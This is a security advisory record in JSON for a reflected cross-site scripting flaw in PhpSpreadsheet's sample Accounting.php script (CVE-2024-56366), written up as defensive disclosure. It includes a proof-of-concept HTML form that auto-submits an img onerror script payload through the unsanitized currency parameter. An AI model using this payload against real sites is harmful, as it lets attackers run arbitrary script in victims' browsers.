{
  "Severity": "HIGH",
  "UpdatedAt": "2025-03-06T18:20:26Z",
  "Package": {
    "Ecosystem": "COMPOSER",
    "Name": "phpoffice/phpexcel"
  },
  "Advisory": {
    "DatabaseId": 274210,
    "Id": "GSA_kwCzR0hTQS1jNmZ2LTd2aDgtMnJocs4ABC8i",
    "GhsaId": "GHSA-c6fv-7vh8-2rhr",
    "References": [
      {
        "Url": "https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr"
      },
      {
        "Url": "https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-56366"
      },
      {
        "Url": "https://github.com/advisories/GHSA-c6fv-7vh8-2rhr"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-c6fv-7vh8-2rhr"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-56366"
      }
    ],
    "Description": "# Unauthorized Reflected XSS in the `Accounting.php` file\n\n**Product**: Phpspreadsheet\n**Version**: version 3.6.0\n**CWE-ID**: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n**CVSS vector v.3.1**: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n**CVSS vector v.4.0**: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n**Description**: using the `/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php` script, an attacker can perform a XSS-type attack\n**Impact**: executing arbitrary JavaScript code in the browser\n**Vulnerable component**: the `/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php` file\n**Exploitation conditions**: an unauthorized user\n**Mitigation**: sanitization of the currency variable\n**Researcher**: Aleksey Solovev (Positive Technologies)\n\n# Research\n\nThe researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in `Accounting.php` file) in Phpspreadsheet.\n\nThere is no sanitization in the `/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php` file, which leads to the possibility of a XSS attack.\nStrings are formed using the currency parameter without sanitization, which is controlled by the attacker.\n\n![fig7](https://github.com/user-attachments/assets/da0ee52d-2306-4770-a61d-bce4ba553f4f)\n\n*Figure 7. A fragment of the query in which a string and a parameter are formed without sanitization*\n\nAn attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.\n\n*Listing 4. HTML form that demonstrates the exploitation of the XSS vulnerability*\n\n```\n\u003chtml\u003e\n  \u003c!-- CSRF PoC - generated by Burp Suite Professional --\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"number\" value=\"1234\u0026#46;5678\" /\u003e\n      \u003cinput type=\"hidden\" name=\"currency\" value=\"\u0026#36;\u0026lt;img\u0026#32;src\u0026#61;1\u0026#32;onerror\u0026#61;alert\u0026#40;\u0026#41;\u0026gt;\" /\u003e\n      \u003cinput type=\"hidden\" name=\"decimals\" value=\"2\" /\u003e\n      \u003cinput type=\"hidden\" name=\"position\" value=\"1\" /\u003e\n      \u003cinput type=\"hidden\" name=\"spacing\" value=\"0\" /\u003e\n      \u003cinput type=\"hidden\" name=\"submit\" value=\"Display\u0026#32;Mask\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n    \u003cscript\u003e\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    \u003c/script\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nAfter sending the script provided in Listing 4, the XSS vulnerability is exploited. Figure 8 shows the execution of arbitrary JavaScript code during the submission of a POST form.\n\n\u003cimg width=\"460\" alt=\"fig8\" src=\"https://github.com/user-attachments/assets/b009256e-61f7-4d72-8f6a-cc6e0efe2bb1\" /\u003e\n\n*Figure 8. Executing arbitrary JavaScript code*\n\n# Credit\nThis vulnerability was discovered by **Aleksey Solovev (Positive Technologies)**",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-01-03T17:06:23Z",
    "Severity": "HIGH",
    "Summary": "PhpSpreadsheet allows unauthorized Reflected XSS in the Accounting.php file",
    "UpdatedAt": "2025-03-06T18:20:26Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 7.1,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": ""
      },
      "VulnerableVersionRange": "\u003c= 1.8.2"
    }
  ]
}